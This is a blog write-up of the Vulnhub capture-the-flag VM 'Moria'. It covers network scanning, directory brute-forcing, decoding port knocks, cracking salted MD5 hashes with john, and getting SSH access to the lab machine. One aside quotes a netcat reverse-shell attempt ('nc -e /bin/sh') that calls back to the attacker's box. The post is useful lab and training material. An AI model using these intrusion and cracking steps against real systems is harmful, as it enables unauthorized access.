---
layout: post
title:  "Vulnhub Video Walkthrough Series: Moria"
date:   2017-05-24 19:00:00 +0200
categories: vulnhub
draft: true
---

I was asked to test a VM created by a fellow mod of the netsecfocus slack community (<a href="http://netsecfocus.com">netsecfocus.com</a>, <a href="http://netsecfocus.herokuapp.com">netsecfocus.herokuapp.com</a>). Here is a writeup of "Moria" by the ever-so-clever @abatchy!

<!--more-->

Step 1: Find it.
<pre>netdiscover -r 192.168.207.0/24</pre>
<img class="alignleft wp-image-50 size-full" src="http://blog.c0la.org/wp-content/uploads/2017/03/netdiscover.png" alt="" width="654" height="298" />
Nice. Let's do a quick little initial scan with nmap.
<pre>nmap -p- 192.168.207.137</pre>
<img class="wp-image-51 size-full alignleft" src="http://blog.c0la.org/wp-content/uploads/2017/03/nmap.png" alt="" width="666" height="249" />


Ok, let's throw it in a web browser and see what happens

<img class="wp-image-52 size-full alignleft" src="http://blog.c0la.org/wp-content/uploads/2017/03/firefox.png" alt="" width="380" height="690" />


Hmm, nothing here other than this picture. Let's throw dirb at it.
<pre>dirb http://192.168.207.137 -w</pre>
<img class="alignnone wp-image-53 size-full" src="http://blog.c0la.org/wp-content/uploads/2017/03/dirbout.png" alt="" width="662" height="223" />

Browsing to 192.168.207.137/w/h/i/s/p/e/r/ shows a page called the_abyss, which seems to display a random line of dialog. Instead of refreshing it over and over to get the message, I did this:
<pre>for i in {1..1000}; do curl http://192.168.207.137/w/h/i/s/p/e/r/the_abyss/ &gt;&gt; ~/abyss.txt; done; sort ~/abyss.txt | uniq</pre>
Which returned the following (I believe this has changed to be a little more obvious in the official release):

<img class="alignnone wp-image-54 size-full" src="http://blog.c0la.org/wp-content/uploads/2017/03/uniqout.png" alt="" width="400" height="232" />

My first thought was port knocking, so I tried https://github.com/pan0pt1c0n/knock-knock, mostly because of the string "Knock knock", but I didn't have any luck with that. Perhaps I'm not the one who is supposed to be knocking...
<pre>tcpdump -vvnn | grep 192.168.207.137 | grep 192.168.207.129</pre>
I let this run for a bit and returned to this output (some has been omitted)

<img class="alignnone wp-image-55 size-full" src="http://blog.c0la.org/wp-content/uploads/2017/03/tcpdumpout.png" alt="" width="660" height="273" />

Connections from Moria to my Kali box! (I encourage you after rooting it to take a look at the script that does this. It's pretty clever.)

The ports in question are : "77 101 108 108 111 110"

If you plug those numbers into an online decimal to ascii converter - you get "Mellon"

Maybe this is a password, let's check ftp.

<img class="alignnone wp-image-57 size-full" src="http://blog.c0la.org/wp-content/uploads/2017/03/ftpout.png" alt="" width="460" height="187" />

Oh look, a username (Balrog). Neat.

(When I first went through this, I saw the Balrog user in the ftp banner, and tried "Mellon" over ssh. It spat out "WRONG GATE" and kicked me off. After this happened I tried to execute a something like this "ssh Balrog@Moria 'nc -e /bin/sh 192.168.207.129 8080'" with no success.)

So I poked around a little bit:

<img class="alignnone wp-image-58 size-full" src="http://blog.c0la.org/wp-content/uploads/2017/03/ftpwwwls.png" alt="" width="857" height="201" />

"QlVraKW4fbIkXau9zkAPNGzviT3UKntl" looks fishy, let's check it out.

<img class="alignnone size-medium wp-image-59" src="http://blog.c0la.org/wp-content/uploads/2017/03/firefoxhash-300x293.png" alt="" width="300" height="293" />

Cool. Hashes. BUT WAIT! There's more!

<img class="alignnone size-full wp-image-60" src="http://blog.c0la.org/wp-content/uploads/2017/03/firefoxsource.png" alt="" width="188" height="216" />

A little salt action in sauce. At least he gave us "MD5(MD5(Password).Salt)"

Let's tidy this up a bit...
<blockquote>
<pre>Balin:c2d8960157fc8540f6d5d66594e165e0$6MAp84
Oin:727a279d913fba677c490102b135e51e$bQkChe
Ori:8c3c3152a5c64ffb683d78efc3520114$HnqeN4
Maeglin:6ba94d6322f53f30aca4f34960203703$e5ad5s
Fundin:c789ec9fae1cd07adfc02930a39486a1$g9Wxv7
Nain:fec21f5c7dcf8e5e54537cfda92df5fe$HCCsxP
Dain:6a113db1fd25c5501ec3a5936d817c29$cC5nTr
Thrain:7db5040c351237e8332bfbba757a1019$h8spZR
Telchar:dd272382909a4f51163c77da6356cc6f$tb9AWe</pre>
</blockquote>
Saved it as 'mypasswd' and sent it to john...
<pre>john -form=dynamic_6 mypasswd</pre>
<img class="alignnone wp-image-61 size-full" src="http://blog.c0la.org/wp-content/uploads/2017/03/pasted_image_at_2017_03_14_11_16_pm_720.png" alt="" width="719" height="214" />

How rude, Maeglin...

Maybe we can finally get a low priv shell!

<img class="alignnone size-full wp-image-62" src="http://blog.c0la.org/wp-content/uploads/2017/03/orissh.png" alt="" width="607" height="78" />

This is the part where @abatchy (almost) made me cry. I probably spent somewhere between 8-12 hours in this shell. At one point I even made a list of every file on the system in order of creation date to try and see how he did it.

<img class="" src="https://files.slack.com/files-pri/T2A55CJDD-F4HRDLWU9/pasted_image_at_2017_03_15_02_19_am.png" width="629" height="191" />

So here's the first thing I did when I logged in:

<img class="alignnone size-full wp-image-63" src="http://blog.c0la.org/wp-content/uploads/2017/03/orilsandpoem.png" alt="" width="591" height="311" />

I poked around in the (empty) .bash_history, and looked through .ssh

<img class="alignnone size-full wp-image-64" src="http://blog.c0la.org/wp-content/uploads/2017/03/oricdssh.png" alt="" width="665" height="238" />

I believe the exact thought that went through my head was "Weird that he took the time to generate a private key for Ori when we authenticated with a password. Also weird that the known_hosts file has only localhost in it. Huh, anyways off to try every other thing I can think of."

Oops.

<img class="alignnone size-full wp-image-65" src="http://blog.c0la.org/wp-content/uploads/2017/03/root.png" alt="" width="592" height="97" />

Lessons learned:

1)  Follow through with your suspicions, leave no stone unturned.

2) Privilege escalation is a massive topic.

and of course

3) Try harder!

Thank you so much @abatchy for letting me test this VM! You made something super cool and I hope to work with you more in the future!
